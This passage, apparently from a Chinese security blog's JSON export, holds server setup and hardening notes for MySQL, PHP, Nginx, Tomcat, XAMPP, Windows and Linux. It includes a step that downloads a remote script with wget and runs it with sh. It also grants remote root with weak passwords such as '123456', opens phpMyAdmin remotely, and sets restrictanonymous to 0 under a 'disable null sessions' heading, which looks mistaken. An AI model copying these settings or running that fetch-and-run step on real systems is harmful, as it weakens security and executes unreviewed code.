wF4t6oiiju)o\n# 更改密码\nALTER USER 'root'@'localhost' IDENTIFIED BY 'Qwer1234@';\n\n```\n\n- 查看默认密码策略\n\n![image-20230706225840203](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230706225840203.png)\n\n如需关闭密码策略，在/etc/my.cnf 中添加\n\nvalidate_password= off\n\n- 创建数据库和账号\n\n  ```\n  # 创建数据库\n  mysql> create database web_site character set utf8 collate utf8_general_ci;\n  Query OK, 1 row affected (0.00 sec)\n  # 创建用户\n  mysql> create user john@'%' identified by 'Asdf1234@';\n  Query OK, 0 rows affected (0.00 sec)\n  # 授权用户用于该数据库的所有表的权限\n  mysql> grant all privileges on web_site.* to john@'%';\n  Query OK, 0 rows affected (0.00 sec)\n  # 查看用户是否添加成功\n  mysql> use mysql;\n  Reading table information for completion of table and column names\n  You can turn off this feature to get a quicker startup with -A\n  \n  Database changed\n  mysql> select User,Host,authentication_string from user;\n  +---------------+-----------+-------------------------------------------+\n  | User          | Host      | authentication_string                     |\n  +---------------+-----------+-------------------------------------------+\n  | root          | localhost | *F393111FF4D128DBA783646EDBD577DC15DEBE40 |\n  | mysql.session | localhost | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |\n  | mysql.sys     | localhost | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |\n  | john          | %         | *C244E5730489A669785440CA0861C36379D08029 |\n  +---------------+-----------+-------------------------------------------+\n  4 rows in set (0.00 sec)\n  ```\n\n  \n\n#### 2、php7.3 源码安装\n\n- 安装依赖库\n\n  ```shell\n  yum install -y gcc gcc-c++ make sudo autoconf libtool-ltdl-devel gd-devel freetype-devel libxml2-devel libjpeg-devel libpng-devel curl-devel patch ncurses-devel bzip2 libcap-devel ntp diffutils sendmail iptables unzip cmake pcre-devel zlib-devel openssl openssl-devel libmcrypt-devel libmhash-devel sysklogd\n  \n  # 其中libmcrypt-devel libmhash-devel 安装失败\n  解决办法\n  1、安装第三方yum源\n  wget http://www.atomicorp.com/installers/atomic\n  sh ./atomic\n  2、使用yum命令安装\n  yum  install  libmcrypt-devel libmhash-devel\n  \n  # sysklogd 安装失败，说是在较新的 Linux 发行版中，rsyslog 已经取代了 sysklogd，就没管了\n  ```\n\n- 创建用户和组\n\n  ```\n  [root@192 ~]# groupadd www\n  [root@192 ~]# useradd -r www -g www\n  ```\n\n- 安装\n\n```\n./configure --prefix=/usr/local/php --enable-fpm --with-fpm-user=www --with-fpm-group=www --with-openssl --with-libxml-dir --with-zlib --enable-mbstring --with-mysqli=mysqlnd --enable-mysqlnd --with-pdo-mysql=mysqlnd --with-gd --with-jpeg-dir --with-png-dir --with-zlib-dir --with-freetype-dir --enable-sockets --with-curl --enable-maintainer-zts \n\nmake \nmake install\n```\n\n- 配置PHP环境\n\n  ```\n  cd /usr/local/php/\n  cp etc/php-fpm.conf.default etc/php-fpm.conf\n  cp etc/php-fpm.d/www.conf.default etc/php-fpm.d/www.conf\n  cp /root/php-7.3.32/php.ini-production lib/php.ini\n  /usr/local/php/sbin/php-fpm \n  \n  \n  [root@192 php]# netstat -anplt\n  Active Internet connections (servers and established)\n  Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \n  tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      110017/php-fpm: mas \n  ```\n\n  开启php-fp, 启动9000进行监听，获取从Nignx发送过来的处理请求。\n\n#### 3、安装Nginx（支持LUA）\n\n（注意各个版本，所使用的版本不同可能最后编译失败）\n\n- 安装LuaJIT\n\n  ```shell\n  cd /opt/\n  wget http://luajit.org/download/LuaJIT-2.0.5.tar.gz\n  tar -zxf LuaJIT-2.0.5.tar.gz \n  cd LuaJIT-2.0.5/\n  make && make install\n  ```\n\n- 安装ngx_devel_kit\n\n  ```shell\n  #下载链接\n  https://github.com/vision5/ngx_devel_kit/archive/refs/tags/v0.3.2.tar.gz\n  拷贝到/opt 目录\n  cd /opt\n  tar -zxvf ngx_devel_kit-0.3.2.tar.gz\n  ```\n\n- 安装nginx_lua_module\n\n  ```\n  # 下载链接\n  https://github.com/openresty/lua-nginx-module/archive/refs/tags/v0.10.13.tar.gz\n  拷贝到/opt目录\n  cd /opt\n  tar -zxf lua-nginx-module-0.10.13.tar.gz\n  ```\n\n- 导入环境变量\n\n  ```shell\n  vim /etc/profile\n  # 添加到末尾\n  export LUAJIT_LIB=/usr/local/lib\n  export LUAJIT_INC=/usr/local/include/luajit-2.0\n  ```\n\n- 安装nginx\n\n  ```\n  tar -zxf nginx-1.22.1.tar.gz \n  cd nginx-1.22.1/\n  ./configure --user=www --group=www --prefix=/usr/local/nginx --with-http_stub_status_module --with-http_ssl_module --with-http_gzip_static_module --pid-path=/usr/local/nginx/nginx.pid --with-http_realip_module --add-module=/opt/ngx_devel_kit-0.3.2 --add-module=/opt/lua-nginx-module-0.10.13 --with-ld-opt=\"-Wl,-rpath,$LUAJIT_LIB\"\n  make -j2 && make install\n  firewall-cmd --add-port=80/tcp --permanent\n  /usr/local/nginx/sbin/nginx\n  ```\n\n  环境安装基本结束\n\n#### 4、配置站点\n\n- 1、创建文件夹存放站点\n\n- 2、递归修改所有的目录所有者,文件所有者为www\n\n- 3、修改数据库连接信息\n\n- 4、修改nginx.conf ，配置网站根目录，取消location 注释等，根据实际情况修改。\n\n![image-20230710215441928](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230710215441928.png)\n\n- 5、配置thinkphp的URL地址重写，修改nginx.conf 。\n\n","tags":["web渗透"],"categories":["web渗透"]},{"title":"Nginx","url":"/2023/07/03/Web渗透/Nginx_new/","content":"\n\n### Nginx\n\n 1、概念\n\n轻量应用服务器、高并发\n\n2、反向代理与正向代理\n\n正向代理示意图\n\n![image-20230703214801703](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230703214801703.png)\n\n作用：\n\n- 访问无法访问的资源如Google\n- 做缓存，加速访问资源，如CDN\n- 对客户端进行访问授权，上网认证\n- 记录用户访问记录，上网行为管理\n\n反向代理\n\n![image-20230703215040740](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230703215040740.png)\n\n- 保证内网的安全，阻止web攻击，大型网站，通常将反向代理作为公网访问地址，Web服务器是内网\n- 负载均衡，通过反向代理来优化网站的负载\n- 故障转移\n\n3、安装\n\n```\nwget http://nginx.org/download/nginx-1.25.1.tar.gz\ntar -zxvf nginx-1.25.1.tar.gz \ncd nginx-1.25.1/\nyum -y install gcc pcre-devel zlib-devel openssl openssl-devel\n./configure --prefix=/usr/local/nginx --with-http_ssl_module\nmake\nmake install\n[root@192 nginx-1.25.1]# whereis nginx\nnginx: /usr/local/nginx\n/usr/local/nginx/sbin/nginx \n```\n\n4、nginx 连接Tomcat  (单节点配置)\n\n![image-20230703223223518](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230703223223518.png)\n\n正常站点还要添加另一个location\n\n```\nlocation /website/{\n\tproxy_pass http:mytomcat/website/;\n\tproxy_redirect default;\n}\n```\n\n此时访问 http://192.168.101.10:80（nginx） 即为访问http://192.168.101.10:8080（Tomcat）\n\n多节点新增Server即可。增加ip_hash ;保证同一个IP只分配同一个节点。\n\n```\nupstream mytomcat{\n        ip_hash ;\n        # 指定Tomcat的服务器IP地址 端口以及权重\n        server 192.168.101.10:8080 weight=1;\n        server 192.168.101.11:8080 weight=1;\n     }\n```\n\n","tags":["web渗透"],"categories":["web渗透"]},{"title":"Java_Tomcat环境","url":"/2023/06/27/Web渗透/Java_Tomcat环境_new/","content":"\n\n### Java_Tomcat环境\n\n\n\nTomcat 核心功能是作为Java的容器来运行Java的后台代码，并内置对HTTP请求的处理，但不是最优选择，前面往往加一个Apache或者Nigix 处理HTTP请求。\n\n1、 单独安装Mysql5.6环境\n\n```\nwget http://repo.mysql.com/mysql-community-release-el6-5.noarch.rpm\nyum list installed | grep mysql\nrpm -qa|grep -i mariadb\nrpm -qa|grep mariadb|xargs rpm -e --nodeps\nrpm -qa|grep -i mariadb\nrpm -ivh mysql-community-release-el6-5.noarch.rpm\nyum repolist all | grep mysql\nyum install mysql-community-server\nsystemctl status mysqld\nsystemctl start mysqld\nsystemctl status mysqld\nmysql -uroot\n    use mysql;\n    UPDATE user SET Password=PASSWORD('123456') WHERE User='root';\n    GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;\n    FLUSH privileges;\n\nsystectl restart mysqld\n\n# 如果不小心改错了,以不验证模式启动Mysql\nsystemctl stop mysqld\nmysqld_safe --skip-grant-tables  \n随后登录，更改\n\n```\n\n2 .安装Tomcat 8.5 (java 已安装)\n\n下载链接 https://tomcat.apache.org/download-80.cgi\n\n```shell\ntar xzvf apache-tomcat-8.5.90.tar.gz\nmv apache-tomcat-8.5.90 /opt\necho 'export CATALINA_HOME=/opt/apache-tomcat-8.5.90' >> ~/.bashrc\necho 'export PATH=$CATALINA_HOME/bin:$PATH' >> ~/.bashrc\nsource ~/.bashrc\n\n# 防火墙\nfirewall-cmd --add-port=8080/tcp --permanent\n# 启动\n$CATALINA_HOME/bin/startup.sh\n\n# 默认配置文件\n/opt/apache-tomcat-8.5.90/conf/server.xml\n\n#默认日志文件\n/opt/apache-tomcat-8.5.90/log/catalina.out\n\n#访问日志文件\n/opt/apache-tomcat-8.5.90/log/localhost_access_log.2023-06-27.txt\n```\n\n默认网站根目录如下\n\n![image-20230627232003484](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230627232003484.png)\n\n数据库连接文件\n\n修改对应的网站的数据库连接情况，导入数据库，\n\n3、配置HTTPS\n\n```\n[root@192 apache-tomcat-8.5.90]# keytool -genkeypair -alias \"tomcat\" -keyalg \"RSA\" -keystore \"/opt/tomcat.keystore\"\nEnter keystore password:  \nRe-enter new password: \nWhat is your first and last name?\n  [Unknown]:  jie\nWhat is the name of your organizational unit?\n  [Unknown]:  360\nWhat is the name of your organization?\n  [Unknown]:  360\nWhat is the name of your City or Locality?\n  [Unknown]:  chengdu\nWhat is the name of your State or Province?\n  [Unknown]:  sichuan\nWhat is the two-letter country code for this unit?\n  [Unknown]:  cn\nIs CN=jie, OU=360, O=360, L=chengdu, ST=sichuan, C=cn correct?\n  [no]:  yes\n\nEnter key password for <tomcat>\n        (RETURN if same as keystore password):  \nRe-enter new password: \n\nWarning:\nThe JKS keystore uses a proprietary format. It is recommended to migrate to PKCS12 which is an industry standard format using \"keytool -importkeystore -srckeystore /opt/tomcat.keystore -destkeystore /opt/tomcat.keystore -deststoretype pkcs12\".\n[root@192 apache-tomcat-8.5.90]# keytool -importkeystore -srckeystore /opt/tomcat.keystore -destkeystore /opt/tomcat.keystore -deststoretype pkcs12\"\n> ^C\n[root@192 apache-tomcat-8.5.90]# keytool -importkeystore -srckeystore /opt/tomcat.keystore -destkeystore /opt/tomcat.keystore -deststoretype pkcs12\nEnter source keystore password:  \nEntry for alias tomcat successfully imported.\nImport command completed:  1 entries successfully imported, 0 entries failed or cancelled\n\nWarning:\nMigrated \"/opt/tomcat.keystore\" to Non JKS/JCEKS. The JKS keystore is backed up as \"/opt/tomcat.keystore.old\".\n\n\n接着更改配置文件conf/server.xml\n\n    <Connector port=\"8443\" protocol=\"org.apache.coyote.http11.Http11NioProtocol\"\n               maxThreads=\"150\" SSLEnabled=\"true\"\n               maxParameterCount=\"1000\"\n               keystoreFile=\"/opt/tomcat.keystore\" keystorePass=\"123456\"\n               >\n        <SSLHostConfig>\n            <Certificate certificateKeystoreFile=\"conf/localhost-rsa.jks\"\n                         type=\"RSA\" />\n        </SSLHostConfig>\n    </Connector>\n\n\n```\n\n","tags":["web渗透"],"categories":["web渗透"]},{"title":"LAMP环境","url":"/2023/06/24/Web渗透/LAMP环境_new/","content":"\n\n### Lampp环境\n\n1、基本概念与环境\n\nLinux+apache2+mysql+php+python\n\nXmapp 是集合了LAMPP 的完整的运行环境，相对来说适用于开发和调试，但是安全性配置不足，相对而言漏洞较多。\n\n- Xmapp 启动后，Apache 使用端口80，防火墙要放行\n\n```shell\nfirewall-cmd  --add-port=80/tcp  --permanent\n```\n\n- http://ip/dashboard/phpinfo.php 展示了所有运行环境参数，通常情况下，***配置完成后要删除该页面***\n\n- 默认情况下，/opt/lampp/htdocs 目录是应用程序的根目录。\n\n- phpmyadmin 是mysql的网页端，***默认情况下禁止远程访问***\n\n  ```shell\n  # 修改/opt/lampp/etc/extra/httpd-xampp.conf \n  # 注释  Require local  新增  Require all granted 即可运行远程访问\n  # since XAMPP 1.4.3\n  <Directory \"/opt/lampp/phpmyadmin\">\n      AllowOverride AuthConfig Limit\n      # Require local\n      Require all granted\n      ErrorDocument 403 /error/XAMPP_FORBIDDEN.html.var\n  </Directory>\n  ```\n\n- 确认服务和端口正常启动\n\n  - 修改默认端口，修改配置文件/opt/lampp/etc/httpd.conf，***改成非80，更安全***\n\n  - 如果出现内核版本不兼容情况，修改/opt/lampp/lampp ，将内核版本修改为2.8.0以上。\n\n  ```shell\n  LD_ASSUME_KERNEL=2.8.0\n  ```\n\n- 部署对应的系统或者网站，导入数据库，修改配置文件等。\n\n  注意配置数据库时\n\n  - 修改root默认密码\n  - 配置phpmyadmin 允许远程访问，或者设置一个可以远程访问的用户，然后用navicat连接进行配置\n\n  ```\n  默认数据库的user情况\n  MariaDB [mysql]> select User,Password,Host from user;\n  +------+----------+-----------+\n  | User | Password | Host      |\n  +------+----------+-----------+\n  | root |          | localhost |\n  | root |          | 127.0.0.1 |\n  | root |          | ::1       |\n  |      |          | localhost |\n  | root |          | %         |\n  | pma  |          | localhost\n  \n  第一行：用户名为 root，密码为空白，允许从 localhost 发起连接请求，不需要密码。\n  第二行：用户名为 root，密码为空白，允许从 127.0.0.1 发起连接请求，不需要密码。\n  第三行：用户名为 root，密码为空白，允许从 ::1 发起连接请求，不需要密码。\n  第四行：用户名为空白，密码为空白，允许从 localhost 发起连接请求。这行数据有些特殊，因为它可以允许任何人以匿名身份登录，不需要密码。\n  第五行：用户名为 root，密码为空白，允许从任意主机（%）发起连接请求。注意，在使用通配符 % 时需要小心，因为这样很可能导致安全漏洞，不需要密码。\n  第六行：用户名为 pma，密码为空白，允许从 localhost 发起连接请求。pma 是 phpMyAdmin 中默认创建的一个用户，用于管理 MySQL 数据库，不需要密码。\n  ```\n\n  \n  \n  两种方式修改mysql的密码：\n  \n  第一种方式：\n  \n  phpmyadmin 点击修改权限，找到change password, 添加密码，然后修改phpmyadmin/config.inc.php\n  \n  ```\n  $cfg['Servers'][$i]['password'] = '654321';\n  ```\n  \n  ![image-20230625225559571](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230625225559571.png)\n  \n  第二种方式，默认空密码登陆后\n  \n  ```mysql\n  mysql -uroot \n  update user set authentication_string=password('qwe123') where user='root' and host='localhost';\n  update user set authentication_string=password('qwe123') where user='root' and host='127.0.0.1';\n  update user set authentication_string=password('xxxxxx') where user='root' and host='%';\n  flush privileges\n  # 注意 authentication_string 在低版本是password ，在高版本是 authentication_string\n  而不是下面的语句\n  update user set password='qwe123' where user='root' and host='localhost';\n  ```\n\n注意如果密码出错，无法登录进去的话，可以修改my.cnf 加入\n\n```shell\nskip-grant-tables\n```\n\n\n\n***安全起见，一般要禁用phpmyadmin***，有三种方法\n\n1、设置访问密码，更改PhpMyadmin的默认config 模式为cookie模式\n\n```\n使用cookie授权模式 将'auth_type'改为'cookie'，然后修改'blowfish_secret'用一个任意字符串作为cookie的加密字符串，如果没有加密钥匙,系统会显示\"配置文件现在需要绝密的短语密码(blowfish_secret) \" ,配置文件如下:\n\n$cfg['Servers'][$i]['auth_type'] = 'cookie'; $cfg['blowfish_secret'] = '44e2f5aece2855.93921574';\n```\n\n2、禁用phpMyadmin，在httpd.conf  注释掉http-xmapp.conf的包含目录，删除phpmyadmin\n\n3、管理数据库，使用数据库，phpmyadmin 放在另一个服务器上之类的\n\n4、使用knock 进行端口隐藏，使用时再打开\n\n***其他注意事项***\n\n1、任何一个URL地址，一定要指定到具体的文件，如果没有指定，访问默认首页\n\n如 httpd.conf \n\n```shell\nDirectoryIndex index.html index.html.var index.php index.php3 index.php4\n```\n\n默认下，任何一个目录，如果只输入目录名而不输入文件名去访问，该目录必须要有一个默认主文件，比如index.html。index.php ，index.jsp  default.php  main.php 否则将无法访问到该页面，***不然就是明显的安全漏洞***，如目录浏览\n\n2、***为了防止目录浏览，还可以修改httpd.conf ，修改options*** \n\n```shell\nOptions Indexes FollowSymLinks ExecCGI Includes\n改成Options None\n```\n\n","tags":["web渗透"],"categories":["web渗透"]},{"title":"windows 服务器加固技术","url":"/2023/06/11/系统基础/windows 服务器加固技术_new/","content":"\n\n###  Windows 服务器加固技术\n\n#### 1、windows 常用命令\n\n| **命令**                         | **说明**                                |\n| -------------------------------- | --------------------------------------- |\n| ver                              | 查看系统版本                            |\n| hostname                         | 查看主机名                              |\n| ipconfig /all                    | 查看网络配置                            |\n| net user/localgroup/share/config | 查看用户/用户组/共享/当前运行可配置服务 |\n| at                               | 建立或查看系统作业                      |\n| netstat                          | 查看开放端口                            |\n| secpol.msc                       | 查看和修改本地安全设置                  |\n| services.msc                     | 查看和修改服务                          |\n| eventvwr.msc                     | 查看日志                                |\n| regedit                          | 打开注册表                              |\n| whoami                           | 查看当前操作用户的用户名                |\n\n- 修改本地安全策略\n\n  账户策略\n\n  - 密码策略\n  - 账户锁定策略\n\n  本地策略\n\n  - 审核策略\t  -记录成日志\n\n  - 用户权限分配  \n\n  - 安全选项\n\n#### 2、windows 常见端口\n\n| **端口**     | **说明**                                  |\n| ------------ | ----------------------------------------- |\n| 80/8080/8081 | HTTP协议代理服务器常用端口号              |\n| 443          | HTTPS协议代理服务器常用端口号             |\n| 21           | FTP(文件传输协议)协议代理服务器常用端口号 |\n| 23           | Telnet(远程登录)协议代理服务器常用端口号  |\n| 22           | SSH（安全登录）、SCP（文件传输）          |\n| 1521         | Oracle 数据库                             |\n| 1433         | MS SQL SERVER数据库                       |\n| 1080         | QQ                                        |\n| 3306         | Mysql数据库                               |\n| 25           | SMTP（简单邮件传输协议）                  |\n\n#### 3、windows账号及安全策略\n\n  windows+R  secpol.msc \n\n- 账号策略\n\n```\n密码必须符合复杂性要求：启用 \n密码长度最小值         8个字符 \n密码最长使用期限：       30天 \n强制密码历史：         3个记住的密码\n```\n\n- 账号锁定\n\n```\n帐户锁定阀值：         3次无效登陆\n帐户锁定时间：         30分钟 \n复位帐户锁定计数器：30分钟之后\n```\n\n- Administrator账号  组重命名\n\n  `Win + R` 键，然后输入 `compmgmt.msc` 命令打开计算机管理\n\n  ```shell\n  wmic useraccount where name='Administor' call Rename admin\n  ```\n\n- 禁用Guest账户\n\n#### 4、日志以及审核策略\n\n-    windows+R  secpol.msc     本地策略->审核策略\n\n```\n审核策略更改         成功，失败 \n审核登陆事件         成功，失败\n审核对象访问         失败   \n审核目录服务访问   失败 \n审核特权使用        失败   \n审核系统事件         成功，失败  \n审核账户登陆事件   成功，失败  \n审核帐户管理        成功，失败 \n```\n\n- 更改日志大小\n\n  eventvwr.msc\n\n  ```\n  日志类型        日志大小    覆盖策略\n  应用程序        80000KB    覆盖早于30天的日志\n  安全日志        80000KB    覆盖早于30天的日志\n  系统日志        80000KB    覆盖早于30天的日志\n  ```\n\n  \n\n#### 5、安全选项\n\n本地安全策略->本地策略->安全选项\n\n- Microsoft 网络服务器：当登录时间用完时自动注销用户（启用）\n\n目的：可以避免用户在不适合的时间登录到系统,或者用户登录到系统后忘记退出登录\n\n- Microsoft 网络服务器：在挂起会话之前所需的空闲时间（小于等于30分钟）\n\n目的：设置挂起会话之前所需的空闲时间为30分钟\n\n- Microsoft 网络客户端：发送未加密的密码到第三方SMB服务器（禁用）\n\n目的：禁止发送未加密的密码到第三方SMB服务器\n\n- 故障恢复控制台:允许对所有驱动器和文件夹进行软盘复制和访问（禁用）\n\n目的：禁止它访问硬盘驱动器上的所有文件和目录。它仅允许访问每个卷的根目录%systemroot%目\n录及子目录，即使是这样它还限制不允许把硬盘驱动器上的文件拷贝到软盘上\n\n- 故障恢复控 制台:允许自动系统管理级登录（禁用）\n\n目的：恢复控制台是Windows 2003的一个新特性，它在一个不能启动的系统上给出一个受限的命令行访问界面。可能会导致任何可以重起系统的人绕过账号口令限制和其它安全设置而访问系统\n\n- 关机：清除虚拟内存页面文件（启用）\n\n目的：某些第三方的程序可能把一些没有的加密的密码存在内存中，页面文件中也可能含有另外一些敏感的资料。关机的时候清除页面文件，防止造成意外的信息泄漏\n\n- 关机：允许系统在未登录前关机（禁用）\n\n目的：在未登录前不能关闭计算机\n\n- 交互式登录：不显示上次的用户名（启用）\n\n目的：登陆时不显示上次的用户名，防止暴露用户名。\n\n- 交互式登录：不需要按Ctrl+Alt+Del（禁用）\n\n目的：登录时需要按CTRL+ALT+DEL\n\n- 交互式登录：可被缓存的前次登录个数（设置缓存数为0，此项对域服务器无效。）\n\n目的：登陆时不显示上次的用户名，防止暴露用户名\n\n- 网络访问：不允许为网络身份验证储存凭证或 .NET passports(启用）\n- 审核：如果无法记录安全审核则立即关闭系统 （启用）\n- 审核：对全局系统对象的访问进行审核（启用）\n- 网络访问：本地账户的共享和安全模式：仅来宾--本地账户以来宾用户身份验证\n- 网络访问：可匿名访问的共享（全部删除）\n- 网络访问：可匿名访问的命名管道 （全部删除）\n- 网络访问：可远程访问的注册表路径（全部删除）\n- 网络访问：可远程访问的注册表路径和子路径 （全部删除）\n\n**用户权限策略设置**\n\n- 通过终端服务拒绝登陆”中加入Guests、User组\n- “通过终端服务允许登陆”中只加入Administrators组\n- “从网络访问此计算机”中删除PowerUsers和BackupOperators\n- “拒绝本地登录”中添加web和guest用户\n\n#### 6、NTFS安全\n\n**Windows权限的继承性、累加性、优先性、交叉性四项基本原则**\n\n- Windows NT以后的文件，及文件夹共享设置有以下特性：继承性、累加性、优先性、交叉性。\n- 继承性：下级的目录在没有经过重新设置之前，是拥有上一级目录权限设置的。\n- 累加性：是说如一个组GROUP1中有两个用户USER1、USER2，他们同时对某文件或目录的访问权限分别为“读取”和“写入”，那么组GROUP1对该文件或目录的访问权限就为USER1和USER2的访问权限之和。\n- 优先性：权限的这一特性又包含两种子特性，其一是文件的访问权限优先目录的权限，也就是说文件权限可以越过目录的权限，不顾上一级文件夹的设置。另一特性就是“拒绝”权限优先其它权限，也就是说“拒绝”权限可以越过其它所有其它权限，一旦选择了“拒绝”权限，则其它权限也就不能取任何作用，相当于没有设置。\n- 交叉性：指当同一文件夹在为某一用户设置了共享权限的同时又为用户设置了该文件夹的访问权限，且所设权限不一致时，它的取舍原则是取两个权限的交集，也即最严格、最小的那种权限。如目录A为用户USER1设置的共享权限为“只读”，同时目录A为用户USER1设置的访问权限为“完全控制”，那用户USER1的最终访问权限为“只读”。\n\n```\n系统分区C盘                                  administrator、system完全控制\nC:\\Documents and Settings\\                 administrator、system完全控制\nC:\\windows\\system32\\                     administrator读写\nC:\\progran files    为Common File目录之外的所有目录赋予Administrators 和SYSTEM 完全控制\nC:\\windows            系统管理员完全控制、system拒绝(继承)\nC:\\windows\\system32    其关键程序只允许administrator完全控制\nC:\\Inetpub\\            administrator、system完全控制，必要时可以删除该目录\n网站目录所在磁盘       administrator、system完全控制\n```\n\n#### 7、注册表安全设置\n\n```\nHKEY_LOCAL_MACHINE   包含关于本地计算机系统的信息，包括硬件和操作系统数据。\nHKEY_LOCAL_ROOT          包含各种OLE技术使用的信息技术和文件类别关联数据\nHKEY_LOCAL_USER           包含环境变量、桌面设置、网络连接、打印机和程序首选项。\nHKEY_LOCAL_USERS         包含关于动态加载的用户配置文件和默认的配置文件的信息，有些信息和HKEY_CURRENT_USER交叉出现\nHKEY_CURRENT_CONFIG  包含在启动时由本地计算机系统使用的硬件配置文件的相关信息。\n```\n\n**禁止自动登录**\n\n```\nreg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon  /d 0 /f\n\n```\n\n**启用源路由欺骗保护**\n\n```\nreg add \" System\\CurrentControlSet\\ Services\\Tcpip\\Parameters\\ \" /v DisableIPSourceRouting   /t REG_DWORD /d 2 /f\n```\n\n**禁止空链接**\n\n```\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v restrictanonymous  /d 0 /f\n\n```\n\n**删除系统默认共享**\n\n```\n#查看默认共享\nnet share\n#删除默认共享\nnet share <共享名> /del\n\n# 默认共享 在其他主机输入IP，用户名和密码可访问共享\n```\n\n**修改默认3389远程端口**\n\n```\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp\" /v PortNumber  /d 4445 /f\n\n```\n\n**关闭135.139.445隐患端口**\n\n```\n防火墙->新建规则->端口->阻止连接\n135 RPC服务\n139 局域网文件和打印机共享协议\n445 SMB协议的文件共享\n\n```\n\n","tags":["系统基础"],"categories":["系统基础"]},{"title":"Linux系统安全配置","url":"/2023/06/04/系统基础/Linux系统安全配置/","content":"\n\n### Linux系统安全配置\n\n#### 系统权限\n\n##### 1、安装操作系统\n\n1、选择稳定版操作系统\n\n2、最小化安装（后期方便安装应用）\n\n3、不要安装gcc ，make（防止黑客进入以后方便操作）\n\n4、安装系统后更新系统 \n\n```shell\nyum -y update\n```\n\n##### 2、文件权限\n\n- 文件夹默认权限  755   777-022 \n\n- 文件默认权限 644       666-022\n\n​       /root   550\n\n​       /etc/passwd   644\n\n​       /etc/shadow  000\n\n\n\n- ###### 冒险位是什么\n\n当一个二进制可执行文件被分配了 SUID 标志位后，该程序就可以以该文件所有者的身份来运行，即使它被其他用户执行。通常情况下，只有一些特定的二进制可执行文件需要使用 setuid 来工作。\n\n本身普通用户jack 不用 less  /etc/shadow 查看\n\n![image-20230604213028261](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230604213028261.png)\n\n给less加了冒险位以后，less 以该文件所有者的身份运行，从而可以查看/etc/shadow。\n\n\n\n- ###### sgid强制位是什么\n\n对目录生效，在此目录创建文件自动归入目录所在组\n\n```shell\nchmod 2777 dirname\n```\n\n如下图所示，xxx目录被设置了强制位，那么即便root用户在该目录创建了一个文件，但是其所属组仍然是jack\n\n![image-20230604213932793](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230604213932793.png)\n\n- ###### sticky粘制位是什么\n\n目录中的文件只能被文件拥有者删除\n\n```shell\nchmod 1777 dirname\n```\n\n- 文件ACL  getfack  setfacl   设置了acl的有+ \n\n  ```shell\n  # 设置acl权限\n  setfacl -m -u:usename:权限  filename    \n  # 查看acl权限\n  getfacl filename\n  # 删除acl权限\n  setfacl -x -u:usename  filename\n  setfacl -b filename\n  ```\n\n  ![image-20230604215439043](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230604215439043.png) \n\n  \n\n- ###### 文件属性chattr lsattr \n\n  ```shell\n  chattr +a filename    文件只能追加不能删除\n  \n  lsattr filename      查看文件属性\n  \n  chattr -a filename    减去追加权限\n  \n  chattr +i  filename   不允许改变也不运行删除\n  \n  示例  让黑客不能添加用户，可以通过修改passwd文件来\n  chattr +i /etc/passwd 不允许修改，也不允许删除，然后隐藏chattr命令，mv +rename \n  \n  \n  示例 2 \n  \n  find /bin /sbin /usr/bin /usr/sbin /etc/passwd /etc/shadow /etc/pam.d  -type -f -exec chattr +i {} \\;\n  \n  示例3  日志文件防止删除\n  \n  chattr +a /var/log/messages  /var/log/secure\n  如果有日志轮转的话\n  vim /etc/logrotate.d/syslog\n  prerotate\n      chattr -a /var/log/messages\n  endscript\n  ......\n  prerotate\n      chattr +a /var/log/messages\n  endscript\n  \n  ```\n\n  ![image-20230604220031131](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230604220031131.png)\n\n##### 3、用户授权\n\n- ###### su \n\n\n```\n# 切换到用户jack 并同时切到用户目录\nsu - jack  # 而不是su jack（在当前目录切换）\n\n```\n\n- ###### sudo\n\n\n```shell\n# 修改用户\nvisudo   = vim /etc/sudoers\n修改语法如下：\njack    ALL=NOPASSWD: /usr/sbin/ip,/usr/sbin/fdisk,/usr/bin/less\n\n\n# 修改用户组\ngroupadd smartgo\nuseradd it01 -G smartgo\n\n%smartgo        ALL=NOPASSWD: /usr/sbin/ip\n%smartgo        ALL=NOPASSWD: /usr/sbin/useradd, /user/sbin/userdel,/bin/passwd\n%smartgo        ALL=NOPASSWD: !/usr/bin/rm\n%smartgo        ALL=NOPASSWD: !/bin/passwd root, !/bin/passwd root --stdin, !/bin/passwd --stdin root\n```\n\n- ###### sudo 日志\n\n```shell\ncat /etc/rsyslog.conf |grep '^authpriv\nauthpriv.*                                              /var/log/secure\n\n```\n\n![image-20230605220654457](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230605220654457.png)\n\n##### 4、用户认证\n\n- PAM认证\n\n  - gdm 认证、kdm 认证\n\n  - su 认证\n\n  - ssh 认证\n  - ftp\n  - samba\n\n- 自带数据库验证方式 Mysql\n- Web验证方式 （httppasswd）\n\nPAM  (Pluggable Authentication Modules) 可拔插认证式模块。\n\n四种认证类型\n\n- auth   认证管理   验证使用者身份，账户和密码  \n- account 用户管理 基于用户时间或者密码有限期来决定是否允许访问\n- password 密码（口令）认证管理 禁止用户反复尝试登陆，在变更密码时进行密码复杂性控制\n- session    会话管理    进行日志记录，或者限制用户登陆的次数，资源限制\n\n流程标记\n\n```shell\nRequired    (必要条件)   验证失败，仍然继续，最后仍然返回Fail\n\nRequisite   （必要条件）  验证失败立即结束\n\nSufficient  （充分条件）  验证成功立即返回，否则忽略结果继续\n\nOptional    